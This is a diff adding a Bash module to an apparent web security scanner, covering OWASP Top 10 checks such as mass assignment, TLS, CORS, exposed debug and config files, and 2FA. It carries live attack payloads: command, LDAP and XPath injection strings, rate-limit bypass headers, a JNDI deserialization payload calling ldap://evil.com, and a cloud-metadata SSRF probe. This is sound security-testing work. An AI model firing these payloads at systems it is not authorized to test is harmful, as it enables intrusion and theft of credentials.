@@ -1,0 +1,669 @@
+# ============================================================
+# Recon Framework - OWASP Top 10 Checks Module
+# Advanced OWASP-specific security checks for steps 51-70
+# ============================================================
+
+# ─── A01: Mass Assignment / Auto-Binding ─────────────────────
+mass_assignment_check() {
+    local target="$1"
+    local output_dir="$2"
+    local ma_dir="$output_dir/mass_assignment"
+
+    mkdir -p "$ma_dir"
+    : > "$ma_dir/mass_assign_findings.txt"
+
+    local param_urls="$output_dir/fuzz_results/urls_with_params.txt"
+    [[ -s "$param_urls" ]] || return
+
+    log_info "Testing mass assignment via PATCH/POST..."
+
+    # Common mass assignment parameters
+    local ma_params="role=admin role=user is_admin=true is_admin=1 admin=1 admin=true user_role=admin"
+
+    # Test POST endpoints for mass assignment
+    if [[ -f "$output_dir/endpoints/all_endpoints.txt" ]]; then
+        grep -iE '/(api|user|profile|account|admin|settings|update|edit)' \
+            "$output_dir/endpoints/all_endpoints.txt" 2>/dev/null | head -3 > "$ma_dir/post_targets.txt"
+
+        while read -r endpoint; do
+            [[ -z "$endpoint" ]] && continue
+            for param in $ma_params; do
+                local field="${param%%=*}" val="${param#*=}"
+                # Real HTTP status (not a body substring), plus proof the server
+                # actually bound our privileged field back into its response object.
+                local code resp
+                code=$(curl -skg -o /dev/null -w '%{http_code}' --max-time 6 -X POST \
+                    -H "Content-Type: application/json" -d "{\"$field\":\"$val\"}" \
+                    ${CURL_AUTH[@]+"${CURL_AUTH[@]}"} "$endpoint" 2>/dev/null || echo 000)
+                [[ "$code" =~ ^(200|201)$ ]] || continue
+                resp=$(curl -skg --max-time 6 -X POST -H "Content-Type: application/json" \
+                    -d "{\"$field\":\"$val\"}" ${CURL_AUTH[@]+"${CURL_AUTH[@]}"} "$endpoint" 2>/dev/null)
+                # Only flag if the exact privileged field:value is reflected back (server bound it).
+                if echo "$resp" | grep -qiE "\"?${field}\"?[[:space:]]*[:=][[:space:]]*\"?${val}\"?"; then
+                    echo "[REVIEW: MASS ASSIGNMENT] $endpoint bound '$field=$val' (verify privilege change manually)" >> "$ma_dir/mass_assign_findings.txt"
+                    log_warn "Possible mass assignment on $endpoint ('$field' reflected) — manual verification required"
+                fi
+            done
+        done < "$ma_dir/post_targets.txt" 2>/dev/null || true
+    fi
+
+    log_ok "Mass assignment check complete - $(safe_count "$ma_dir/mass_assign_findings.txt") findings"
+}
+
+# ─── A02: TLS Cipher Strength Check ────────────────────────
+tls_cipher_check() {
+    local target="$1"
+    local output_dir="$2"
+    local tls_dir="$output_dir/tls_cipher"
+
+    mkdir -p "$tls_dir"
+    : > "$tls_dir/tls_results.txt"
+
+    local base_url
+    [[ "$target" == http* ]] && base_url="$target" || base_url="https://$target"
+
+    # Extract host from URL
+    local host
+    host=$(echo "$base_url" | sed -E 's|https?://([^/]+).*|\1|' | cut -d: -f1)
+
+    log_info "Checking TLS cipher strength on $host..."
+
+    # Only DEPRECATED protocols actually completing a handshake are real issues.
+    local weak_proto=0
+    if check_tool openssl; then
+        for tls_ver in tls1_1 tls1; do
+            # A successful handshake prints a server certificate block.
+            if echo | timeout 6 openssl s_client -connect "$host:443" "-$tls_ver" 2>/dev/null \
+                 | grep -q "BEGIN CERTIFICATE"; then
+                echo "[WEAK TLS] $host negotiated deprecated $tls_ver" >> "$tls_dir/tls_results.txt"
+                weak_proto=1
+            fi
+        done
+        # Record the modern negotiated protocol/cipher for reference (informational).
+        echo | timeout 6 openssl s_client -connect "$host:443" 2>/dev/null \
+            | grep -iE "Protocol[[:space:]]*:|Cipher[[:space:]]*:" | head -2 \
+            >> "$tls_dir/tls_results.txt" 2>/dev/null || true
+    fi
+
+    # Check certificate info
+    if check_tool openssl; then
+        echo "Certificate info:" >> "$tls_dir/tls_results.txt"
+        echo | timeout 5 openssl s_client -connect "$host:443" 2>/dev/null | \
+            openssl x509 -noout -dates -issuer -subject 2>/dev/null >> "$tls_dir/tls_results.txt" || true
+    fi
+
+    if [[ "$weak_proto" -eq 1 ]]; then
+        log_vuln "Deprecated TLS protocol accepted on $host"
+    else
+        log_ok "TLS check complete (no deprecated protocols negotiated)"
+    fi
+}
+
+# ─── A03: Command Injection Check ───────────────────────────
+command_injection_check() {
+    local target="$1"
+    local output_dir="$2"
+    local ci_dir="$output_dir/command_injection"
+
+    mkdir -p "$ci_dir"
+    : > "$ci_dir/cmd_inject_findings.txt"
+
+    local param_urls="$output_dir/fuzz_results/urls_with_params.txt"
+    [[ -s "$param_urls" ]] || return
+
+    log_info "Testing for command injection vectors..."
+
+    # Command injection payloads (each element kept intact; no word-splitting).
+    local ci_payloads=(';id' '|id' '`id`' '$(id)' '%0aid' '&&id')
+    # Distinctive output of the `id` command; a bare "uid=" substring is not enough.
+    local id_sig='uid=[0-9]+\([a-z_][a-z0-9_-]*\)[[:space:]]+gid=[0-9]+\('
+
+    head -5 "$param_urls" | while read -r url; do
+        [[ -z "$url" ]] && continue
+        # Baseline: a benign value must NOT already produce id-like output.
+        local base_resp
+        base_resp=$(curl -skg --max-time 4 ${CURL_AUTH[@]+"${CURL_AUTH[@]}"} "${url}&cmd=recon_probe" 2>/dev/null)
+        echo "$base_resp" | grep -qE "$id_sig" && continue
+        for payload in "${ci_payloads[@]}"; do
+            local test_url="${url}&cmd=$(printf '%s' "$payload" | jq -sRr @uri)"
+            local resp
+            resp=$(curl -skg --max-time 4 ${CURL_AUTH[@]+"${CURL_AUTH[@]}"} "$test_url" 2>/dev/null)
+            if echo "$resp" | grep -qE "$id_sig"; then
+                echo "[CMD INJECTION] $url - payload: $payload (id output observed)" >> "$ci_dir/cmd_inject_findings.txt"
+                record_finding "command_injection" "critical" "CONFIRMED" "$url" "id command output observed"
+                break
+            fi
+        done
+    done
+
+    log_ok "Command injection check complete - $(safe_count "$ci_dir/cmd_inject_findings.txt") findings"
+}
+
+# ─── A03: LDAP Injection Check ────────────────────────────
+ldap_injection_check() {
+    local target="$1"
+    local output_dir="$2"
+    local ldap_dir="$output_dir/ldap_injection"
+
+    mkdir -p "$ldap_dir"
+    : > "$ldap_dir/ldap_findings.txt"
+
+    log_info "Testing for LDAP injection..."
+
+    # LDAP injection payloads
+    local ldap_payloads="*)(uid=*))(|(uid=*)(*)(|pw=*)|*)(pw=*))|pw=*%2A%29%7C%28%7EU%7CIPipes%7C%28%7E|%2A%28%7CU%7C%29%28%7EU%7C"
+
+    local param_urls="$output_dir/fuzz_results/urls_with_params.txt"
+    [[ -s "$param_urls" ]] || return
+
+    # Specific LDAP error/library signatures only — not the generic word "Directory".
+    local ldap_sig='javax\.naming\.|LDAPException|com\.sun\.jndi|Bad search filter|ldap_search|Invalid DN syntax|protocol error.*ldap|System\.DirectoryServices'
+    for payload in $ldap_payloads; do
+        head -5 "$param_urls" | while read -r url; do
+            [[ -z "$url" ]] && continue
+            # Baseline with benign value must not already show LDAP errors.
+            local base_resp
+            base_resp=$(curl -skg --max-time 3 ${CURL_AUTH[@]+"${CURL_AUTH[@]}"} "${url}&ldap_filter=recon_probe" 2>/dev/null)
+            echo "$base_resp" | grep -qiE "$ldap_sig" && continue
+            local test_url="${url}&ldap_filter=$(printf '%s' "$payload" | jq -sRr @uri)"
+            local resp
+            resp=$(curl -skg --max-time 3 ${CURL_AUTH[@]+"${CURL_AUTH[@]}"} "$test_url" 2>/dev/null)
+            if echo "$resp" | grep -qiE "$ldap_sig"; then
+                echo "[LDAP INJECTION] $url - payload: $payload (LDAP error surfaced)" >> "$ldap_dir/ldap_findings.txt"
+                log_vuln "LDAP injection indicator on $url"
+            fi
+        done
+    done
+
+    log_ok "LDAP injection check complete - $(safe_count "$ldap_dir/ldap_findings.txt") findings"
+}
+
+# ─── A03: XPath Injection Check ─────────────────────────────
+xpath_injection_check() {
+    local target="$1"
+    local output_dir="$2"
+    local xpath_dir="$output_dir/xpath_injection"
+
+    mkdir -p "$xpath_dir"
+    : > "$xpath_dir/xpath_findings.txt"
+
+    log_info "Testing for XPath injection..."
+
+    # XPath injection payloads
+    local xpath_payloads="'%20or%20'1'='1|'%20or%20'1'='1'%20or%20'1'='1|'+or+true()+or+'|%27+or+%271%27%3D%271"
+
+    local param_urls="$output_dir/fuzz_results/urls_with_params.txt"
+    [[ -s "$param_urls" ]] || return
+
+    # Specific XPath engine errors only — not generic "xml"/"parser"/"SOAP".
+    local xpath_sig='XPathException|System\.Xml\.XPath|MS\.Internal\.Xml|xmlXPathEval|Invalid predicate|Invalid expression.*xpath|SimpleXMLElement::xpath|unclosed token'
+    for payload in $xpath_payloads; do
+        head -3 "$param_urls" | while read -r url; do
+            [[ -z "$url" ]] && continue
+            local base_resp
+            base_resp=$(curl -skg --max-time 3 ${CURL_AUTH[@]+"${CURL_AUTH[@]}"} "${url}&xpath=recon_probe" 2>/dev/null)
+            echo "$base_resp" | grep -qiE "$xpath_sig" && continue
+            local test_url="${url}&xpath=$(printf '%s' "$payload" | jq -sRr @uri)"
+            local resp
+            resp=$(curl -skg --max-time 3 ${CURL_AUTH[@]+"${CURL_AUTH[@]}"} "$test_url" 2>/dev/null)
+            if echo "$resp" | grep -qiE "$xpath_sig"; then
+                echo "[XPATH INJECTION] $url - payload: $payload (XPath error surfaced)" >> "$xpath_dir/xpath_findings.txt"
+                log_vuln "XPath injection indicator on $url"
+            fi
+        done
+    done
+
+    log_ok "XPath injection check complete - $(safe_count "$xpath_dir/xpath_findings.txt") findings"
+}
+
+# ─── A04: Rate Limit Bypass Check ───────────────────────────
+rate_limit_bypass_check() {
+    local target="$1"
+    local output_dir="$2"
+    local rl_dir="$output_dir/rate_limit_bypass"
+
+    mkdir -p "$rl_dir"
+    : > "$rl_dir/rl_bypass.txt"
+
+    local base_url
+    [[ "$target" == http* ]] && base_url="$target" || base_url="https://$target"
+
+    log_info "Testing rate limit bypass techniques..."
+
+    # Bypass techniques
+    local bypass_headers=(
+        "X-Forwarded-For: 127.0.0.1"
+        "X-Forwarded-For: 192.168.1.1"
+        "X-Original-URL: /admin"
+        "X-Rewrite-URL: /admin"
+        "X-Real-IP: 10.0.0.1"
+        "X-Host: localhost"
+    )
+
+    # Test login endpoints first
+    local login_endpoints=$(grep -iE '/(login|signin|auth|api/auth|user/login)' \
+        "$output_dir/endpoints/all_endpoints.txt" 2>/dev/null | head -5)
+
+    while read -r endpoint; do
+        [[ -z "$endpoint" ]] && continue
+
+        # STEP 1: establish that rate limiting even exists. Hammer the endpoint
+        # until we see a 429/403. Without that, "bypass" is meaningless (a plain
+        # 200 is just a normal response, not evidence of anything).
+        local limited=0 c
+        for _ in $(seq 1 25); do
+            c=$(curl -skg -o /dev/null -w '%{http_code}' --max-time 3 ${CURL_AUTH[@]+"${CURL_AUTH[@]}"} "$endpoint" 2>/dev/null || echo 000)
+            [[ "$c" == "429" || "$c" == "403" ]] && { limited=1; break; }
+        done
+        [[ "$limited" -eq 1 ]] || { echo "[NO RATE LIMIT OBSERVED] $endpoint (bypass test skipped)" >> "$rl_dir/rl_bypass.txt"; continue; }
+
+        # STEP 2: now that the endpoint is limited, see if a header restores 200.
+        for hdr in "${bypass_headers[@]}"; do
+            local resp
+            resp=$(curl -skg -o /dev/null -w '%{http_code}' -H "$hdr" \
+                -H "X-Forwarded-For: $(shuf -i 1-255 -n1).$(shuf -i 1-255 -n1).$(shuf -i 1-255 -n1).$(shuf -i 1-255 -n1)" \
+                --max-time 3 ${CURL_AUTH[@]+"${CURL_AUTH[@]}"} "$endpoint" 2>/dev/null)
+            if [[ "$resp" == "200" ]]; then
+                echo "[RL BYPASS] $endpoint returned 200 via '$hdr' after being rate-limited" >> "$rl_dir/rl_bypass.txt"
+                log_vuln "Rate limit bypass on $endpoint via $hdr"
+            fi
+        done
+    done <<< "$login_endpoints"
+
+    log_ok "Rate limit bypass check complete - $(safe_count "$rl_dir/rl_bypass.txt") findings"
+}
+
+# ─── A04: Race Condition Check ─────────────────────────────
+race_condition_check() {
+    local target="$1"
+    local output_dir="$2"
+    local race_dir="$output_dir/race_condition"
+
+    mkdir -p "$race_dir"
+    : > "$race_dir/race_findings.txt"
+
+    local base_url
+    [[ "$target" == http* ]] && base_url="$target" || base_url="https://$target"
+
+    log_info "Testing race condition on sensitive endpoints..."
+
+    # Test account signup/upgrade race conditions
+    local sensitive_endpoints=$(grep -iE '/(signup|register|upgrade|balance|transfer|redeem|claim|gift|coupon|promo)' \
+        "$output_dir/endpoints/all_endpoints.txt" 2>/dev/null | head -5)
+
+    if [[ -n "$sensitive_endpoints" ]]; then
+        # Run 10 parallel requests and check for status anomalies
+        for _ in $(seq 1 3); do
+            while read -r endpoint; do
+                [[ -z "$endpoint" ]] && continue
+                curl -sk -o /dev/null -w '%{http_code}\n%{time_total}\n' \
+                    --max-time 2 ${CURL_AUTH[@]+"${CURL_AUTH[@]}"} "$endpoint" 2>/dev/null || true
+            done <<< "$sensitive_endpoints" &
+        done
+        wait
+        log_info "Race condition testing requires manual verification - see $race_dir/race_findings.txt"
+    fi
+
+    log_ok "Race condition check complete"
+}
+
+# ─── A05: CORS Trusted Origins Check ────────────────────────
+cors_trusted_origins_check() {
+    local target="$1"
+    local output_dir="$2"
+    local cors_dir="$output_dir/cors_trusted"
+
+    mkdir -p "$cors_dir"
+    : > "$cors_dir/cors_findings.txt"
+
+    local base_url
+    [[ "$target" == http* ]] && base_url="$target" || base_url="https://$target"
+
+    log_info "Testing CORS trusted origins..."
+
+    # Evil.com origin test
+    local evil_origins="https://evil.com https://attacker.com https://malicious.site"
+
+    for origin in $evil_origins; do
+        local resp
+        resp=$(curl -sk -H "Origin: $origin" -o /dev/null -D - \
+            --max-time 5 ${CURL_AUTH[@]+"${CURL_AUTH[@]}"} "$base_url" 2>/dev/null)
+        if echo "$resp" | grep -iqE "Access-Control-Allow-Origin: $origin"; then
+            echo "[CORS TRUSTED ORIGIN] $origin reflected in response" >> "$cors_dir/cors_findings.txt"
+            log_vuln "CORS allows evil origin: $origin"
+        fi
+    done
+
+    log_ok "CORS trusted origins check complete - $(safe_count "$cors_dir/cors_findings.txt") findings"
+}
+
+# ─── A05: Debug Endpoint Check ─────────────────────────────
+debug_endpoint_check() {
+    local target="$1"
+    local output_dir="$2"
+    local debug_dir="$output_dir/debug_endpoints"
+
+    mkdir -p "$debug_dir"
+    : > "$debug_dir/debug_findings.txt"
+
+    local base_url
+    [[ "$target" == http* ]] && base_url="$target" || base_url="https://$target"
+
+    log_info "Scanning for debug/actuator endpoints..."
+
+    # Common debug endpoints
+    local debug_paths="/actuator /actuator/env /actuator/health /actuator/info /debug /debug/pprof /metrics /prometheus /console /admin/debug .env .env.local .env.backup .git/config .svn/entries"
+
+    for path in $debug_paths; do
+        local full_url="${base_url}${path}"
+        # Each debug path has a distinctive content signature; a soft-404 200 won't match.
+        local sig
+        case "$path" in
+            /actuator*)        sig='"_links"|"status"[[:space:]]*:|"diskSpace"|activeProfiles|"health"' ;;
+            /metrics|/prometheus) sig='^# (HELP|TYPE) |[a-z_]+\{[^}]*\}[[:space:]]+[0-9]' ;;
+            *.env*)            sig='^[A-Z][A-Z0-9_]+=' ;;
+            *.git/config)      sig='\[core\]|repositoryformatversion' ;;
+            *.svn/entries)     sig='^[0-9]+$|svn://|dir$' ;;
+            /debug/pprof)      sig='profiles|goroutine|/debug/pprof/' ;;
+            *)                 sig='debug|trace|profiler|console' ;;
+        esac
+        if fp_confirm_content "$full_url" "$sig"; then
+            echo "[DEBUG ENDPOINT] $full_url (content-confirmed)" >> "$debug_dir/debug_findings.txt"
+            log_vuln "Debug endpoint exposed: $full_url"
+        fi
+    done
+
+    log_ok "Debug endpoint check complete - $(safe_count "$debug_dir/debug_findings.txt") findings"
+}
+
+# ─── A06: Dependency Scan ───────────────────────────────────
+dependency_scan() {
+    local target="$1"
+    local output_dir="$2"
+    local dep_dir="$output_dir/dependency_scan"
+
+    mkdir -p "$dep_dir"
+    : > "$dep_dir/dep_findings.txt"
+
+    log_info "Scanning for vulnerable dependencies..."
+
+    local js_files=$(find "$output_dir" -name "*.js" -type f 2>/dev/null | head -5)
+
+    if [[ -n "$js_files" ]]; then
+        for js_file in $js_files; do
+            [[ -s "$js_file" ]] || continue
+            # Check for outdated libraries
+            grep -iE "jquery.*1\.|bootstrap.*[0-9]\.[0-9]\.[0-9]" "$js_file" 2>/dev/null \
+                | head -3 >> "$dep_dir/dep_findings.txt" || true
+        done
+    fi
+
+    # Check JS files crawled for vulnerable package references
+    if [[ -d "$output_dir/js_analysis" ]]; then
+        grep -rih "jquery.*min.js\|bootstrap.min.js" "$output_dir/js_analysis"/*.txt 2>/dev/null \
+            | head -3 >> "$dep_dir/dep_findings.txt" || true
+    fi
+
+    local dep_count
+    dep_count=$(safe_count "$dep_dir/dep_findings.txt")
+    # Finding an old library reference is not itself a vulnerability — the version
+    # must be mapped to a CVE. Report as informational, not a confirmed finding.
+    [[ "$dep_count" -gt 0 ]] && log_info "Outdated library references (verify versions against CVEs): $dep_count" || log_ok "Dependency scan complete"
+}
+
+# ─── A07: OAuth Misconfiguration Check ─────────────────────
+oauth_misconfig_check() {
+    local target="$1"
+    local output_dir="$2"
+    local oauth_dir="$output_dir/oauth_misconfig"
+
+    mkdir -p "$oauth_dir"
+    : > "$oauth_dir/oauth_findings.txt"
+
+    local base_url
+    [[ "$target" == http* ]] && base_url="$target" || base_url="https://$target"
+
+    log_info "Testing OAuth configuration..."
+
+    # Common OAuth/JWT endpoints
+    local oauth_paths="/oauth /oauth2 /oauth/authorize /oauth/token /connect/token /authorize /openid/connect"
+
+    for path in $oauth_paths; do
+        local full_url="${base_url}${path}"
+        local resp
+        resp=$(curl -sk -o /dev/null -w '%{http_code}' --max-time 5 ${CURL_AUTH[@]+"${CURL_AUTH[@]}"} "$full_url" 2>/dev/null)
+        if [[ "$resp" == "200" || "$resp" == "401" || "$resp" == "403" ]]; then
+            echo "[OAUTH ENDPOINT] $full_url -> $resp" >> "$oauth_dir/oauth_findings.txt"
+            log_info "OAuth endpoint found: $full_url ($resp)"
+        fi
+    done
+
+    log_info "OAuth endpoints discovered (not misconfigurations) - $(safe_count \"$oauth_dir/oauth_findings.txt\") endpoints"
+}
+
+# ─── A07: 2FA Bypass Check ───────────────────────────────
+two_factor_bypass_check() {
+    local target="$1"
+    local output_dir="$2"
+    local twofa_dir="$output_dir/2fa_bypass"
+
+    mkdir -p "$twofa_dir"
+    : > "$twofa_dir/2fa_findings.txt"
+
+    local base_url
+    [[ "$target" == http* ]] && base_url="$target" || base_url="https://$target"
+
+    log_info "Testing 2FA bypass patterns..."
+
+    local twofa_endpoints=$(grep -iE '/(2fa|totp|mfa|twofactor|auth|verify|confirm)' \
+        "$output_dir/endpoints/all_endpoints.txt" 2>/dev/null | head -3)
+
+    # A blind empty-token POST cannot be confirmed by words like "success"/"login"
+    # (they appear on nearly every auth page). Only a concrete state change — a new
+    # session cookie or a redirect to an authenticated area — is worth surfacing,
+    # and even then only as a manual-review candidate.
+    while read -r endpoint; do
+        [[ -z "$endpoint" ]] && continue
+        local hdrs
+        hdrs=$(curl -skg -D - -o /dev/null -X POST -d "otp=&code=&token=" --max-time 5 ${CURL_AUTH[@]+"${CURL_AUTH[@]}"} "$endpoint" 2>/dev/null | tr -d '\r')
+        local code; code=$(echo "$hdrs" | grep -oiE '^HTTP/[0-9.]+ [0-9]+' | grep -oE '[0-9]+$' | head -1)
+        # Signal: server issued a session cookie OR redirected to a dashboard/account area.
+        if echo "$hdrs" | grep -qiE '^set-cookie:.*(session|sid|auth|jwt|token)=' && \
+           echo "$hdrs" | grep -qiE '^location:.*(dashboard|account|home|profile)'; then
+            echo "[REVIEW: 2FA] $endpoint set a session + redirected on empty token (HTTP $code) — verify manually" >> "$twofa_dir/2fa_findings.txt"
+            log_warn "Possible 2FA weakness on $endpoint — manual verification required"
+        fi
+    done <<< "$twofa_endpoints"
+
+    log_ok "2FA bypass check complete - $(safe_count "$twofa_dir/2fa_findings.txt") findings"
+}
+
+# ─── A08: CI/CD Exposure Check ─────────────────────────────
+cicd_exposure_check() {
+    local target="$1"
+    local output_dir="$2"
+    local cicd_dir="$output_dir/cicd_exposure"
+
+    mkdir -p "$cicd_dir"
+    : > "$cicd_dir/cicd_findings.txt"
+
+    local base_url
+    [[ "$target" == http* ]] && base_url="$target" || base_url="https://$target"
+
+    log_info "Scanning for CI/CD exposure..."
+
+    local cicd_paths="/.gitlab-ci.yml /.github/workflows /.circleci/config.yml /Jenkinsfile /buildspec.yml /azure-pipelines.yml"
+
+    for path in $cicd_paths; do
+        local full_url="${base_url}${path}"
+        local sig
+        case "$path" in
+            *.yml|*.yaml) sig='^[a-zA-Z_-]+:[[:space:]]*$|stages:|jobs:|steps:|pipeline|image:|script:' ;;
+            *Jenkinsfile) sig='pipeline[[:space:]]*\{|stage\(|agent[[:space:]]|node[[:space:]]*\{' ;;
+            *buildspec*)  sig='version:|phases:|artifacts:' ;;
+            *)            sig='stages:|jobs:|steps:|pipeline' ;;
+        esac
+        if fp_confirm_content "$full_url" "$sig"; then
+            echo "[CI/CD EXPOSURE] $full_url (content-confirmed)" >> "$cicd_dir/cicd_findings.txt"
+            log_vuln "CI/CD config exposed: $full_url"
+        fi
+    done
+
+    log_ok "CI/CD exposure check complete - $(safe_count "$cicd_dir/cicd_findings.txt") findings"
+}
+
+# ─── A08: Deserialization Check ───────────────────────────
+deserialization_check() {
+    local target="$1"
+    local output_dir="$2"
+    local deser_dir="$output_dir/deserialization"
+
+    mkdir -p "$deser_dir"
+    : > "$deser_dir/deser_findings.txt"
+
+    local base_url
+    [[ "$target" == http* ]] && base_url="$target" || base_url="https://$target"
+
+    log_info "Testing insecure deserialization..."
+
+    # Common deserialization payloads (base64 encoded serialized objects)
+    local deser_payloads='{"@type":"java.lang.Runtime","command":"id"} {"@type":"com.sun.rowset.JdbcRowSetImpl","DataSourceName":"ldap://evil.com/Deserialization/"} {"__class__":"dateutil.tz.Eastern"}|O:8:"stdClass":0:{} O:4:"User":1:{s:4:"role";s:5:"admin";}'
+
+    local param_urls="$output_dir/fuzz_results/urls_with_params.txt"
+    [[ -s "$param_urls" ]] || return
+
+    # A payload's own class names appearing in the response usually just means the
+    # input was echoed back — that is NOT a deserialization vulnerability. Only an
+    # actual deserialization *error/stack trace* is a meaningful (still manual) signal.
+    local deser_err_sig='ObjectInputStream|readObject|InvalidClassException|unserialize\(\)|__wakeup|yaml\.load|pickle\.loads|Marshal\.load|SerializationException|deserializ.*error'
+    head -5 "$param_urls" | while read -r url; do
+        [[ -z "$url" ]] && continue
+        # Baseline: benign value must not already produce these errors.
+        local base_resp
+        base_resp=$(curl -skg --max-time 3 ${CURL_AUTH[@]+"${CURL_AUTH[@]}"} "${url}&object=recon_probe" 2>/dev/null)
+        echo "$base_resp" | grep -qiE "$deser_err_sig" && continue
+        for payload in $deser_payloads; do
+            local test_url="${url}&object=$(printf '%s' "$payload" | jq -sRr @uri)"
+            local resp
+            resp=$(curl -skg --max-time 3 ${CURL_AUTH[@]+"${CURL_AUTH[@]}"} "$test_url" 2>/dev/null)
+            if echo "$resp" | grep -qiE "$deser_err_sig"; then
+                echo "[REVIEW: DESERIALIZATION] $url surfaced a deserialization error — verify manually" >> "$deser_dir/deser_findings.txt"
+                log_warn "Possible insecure deserialization on $url — manual verification required"
+                break
+            fi
+        done
+    done
+
+    log_ok "Deserialization check complete - $(safe_count "$deser_dir/deser_findings.txt") findings"
+}
+
+# ─── A08: Supply Chain Check ─────────────────────────────
+supply_chain_check() {
+    local target="$1"
+    local output_dir="$2"
+    local supply_dir="$output_dir/supply_chain"
+
+    mkdir -p "$supply_dir"
+    : > "$supply_dir/supply_findings.txt"
+
+    log_info "Checking supply chain exposure..."
+
+    # Check for exposed package.json, composer.json, requirements.txt etc.
+    local base_url
+    [[ "$target" == http* ]] && base_url="$target" || base_url="https://$target"
+
+    local supply_files="package.json composer.json requirements.txt Pipfile Gemfile yarn.lock package-lock.json yarn.lock"
+
+    for file in $supply_files; do
+        local full_url="${base_url}/${file}"
+        local sig
+        case "$file" in
+            package.json|package-lock.json) sig='"dependencies"|"devDependencies"|"lockfileVersion"' ;;
+            composer.json)                  sig='"require"|"autoload"|"packagist"' ;;
+            requirements.txt)               sig='^[a-zA-Z0-9._-]+[=<>~]=?[0-9]' ;;
+            Pipfile)                        sig='\[\[source\]\]|\[packages\]|\[dev-packages\]' ;;
+            Gemfile)                        sig='^source[[:space:]]|^gem[[:space:]]' ;;
+            yarn.lock)                      sig='^# THIS IS AN AUTOGENERATED FILE|resolved "' ;;
+            *)                              sig='dependencies|require' ;;
+        esac
+        if fp_confirm_content "$full_url" "$sig"; then
+            echo "[SUPPLY CHAIN] $full_url (content-confirmed)" >> "$supply_dir/supply_findings.txt"
+            log_vuln "Dependency manifest exposed: $full_url"
+        fi
+    done
+
+    # Check JS files for vulnerable library versions
+    if [[ -d "$output_dir/js_analysis" ]]; then
+        grep -rh "jquery.*1\.[0-9]\." "$output_dir/js_analysis"/*.txt 2>/dev/null \
+            | head -5 >> "$supply_dir/supply_findings.txt" || true
+    fi
+
+    log_ok "Supply chain check complete - $(safe_count "$supply_dir/supply_findings.txt") findings"
+}
+
+# ─── A09: Security Logging Check ───────────────────────────
+security_logging_check() {
+    local target="$1"
+    local output_dir="$2"
+    local log_dir="$output_dir/security_logging"
+
+    mkdir -p "$log_dir"
+    : > "$log_dir/log_findings.txt"
+
+    local base_url
+    [[ "$target" == http* ]] && base_url="$target" || base_url="https://$target"
+
+    log_info "Testing security logging & monitoring..."
+
+    # Check for access to log files
+    local log_paths="/logs /log /app.log /error.log /access.log /debug.log /application.log"
+
+    # Real log lines look like: "2024-01-02 13:45:01 [ERROR] ..." or bracketed levels
+    # or syslog-style timestamps. The bare word "log" (login/blog/catalog) is not enough.
+    local logline_sig='[0-9]{4}-[0-9]{2}-[0-9]{2}[ T][0-9]{2}:[0-9]{2}:[0-9]{2}|\[(ERROR|WARN|WARNING|INFO|DEBUG|TRACE)\]|(GET|POST|PUT|DELETE) /[^ ]* HTTP/[0-9]|^[A-Z][a-z]{2} [ 0-9][0-9] [0-9]{2}:[0-9]{2}:[0-9]{2}'
+    for path in $log_paths; do
+        local full_url="${base_url}${path}"
+        # Must be a real 200 AND contain actual log-line structure.
+        if fp_real_200 "$full_url"; then
+            local resp; resp=$(fp_body "$full_url")
+            # Exclude HTML pages (a styled 200 page that merely mentions "log").
+            echo "$resp" | grep -qiE '<html|<!doctype html' && continue
+            if echo "$resp" | grep -qE "$logline_sig"; then
+                echo "[SECURITY LOG] $full_url (log-line structure confirmed)" >> "$log_dir/log_findings.txt"
+                log_vuln "Log file exposed: $full_url"
+            fi
+        fi
+    done
+
+    log_ok "Security logging check complete - $(safe_count "$log_dir/log_findings.txt") findings"
+}
+
+# ─── A10: WebSocket SSRF Check ─────────────────────────────
+websocket_ssrf_check() {
+    local target="$1"
+    local output_dir="$2"
+    local ws_dir="$output_dir/websocket_ssrf"
+
+    mkdir -p "$ws_dir"
+    : > "$ws_dir/ws_findings.txt"
+
+    log_info "Testing WebSocket SSRF vectors..."
+
+    # Look for WebSocket endpoints
+    local ws_endpoints=$(grep -rihE 'wss?://[^"'"'"' ]+' "$output_dir/endpoints"/*.txt 2>/dev/null | head -3)
+
+    while read -r ws_url; do
+        [[ -z "$ws_url" ]] && continue
+        echo "[WEBSOCKET] Found endpoint: $ws_url" >> "$ws_dir/ws_findings.txt"
+        log_info "WebSocket endpoint discovered: $ws_url"
+
+        # Try SSRF via WebSocket (requires wscat or similar)
+        if check_tool wscat; then
+            local resp
+            resp=$(timeout 5 wscat -c "$ws_url" -x '{"ip":"169.254.169.254"}' 2>/dev/null) \
+                || true
+        fi
+    done <<< "$ws_endpoints"
+
+    log_ok "WebSocket SSRF check complete - $(safe_count "$ws_dir/ws_findings.txt") endpoints found"
+}
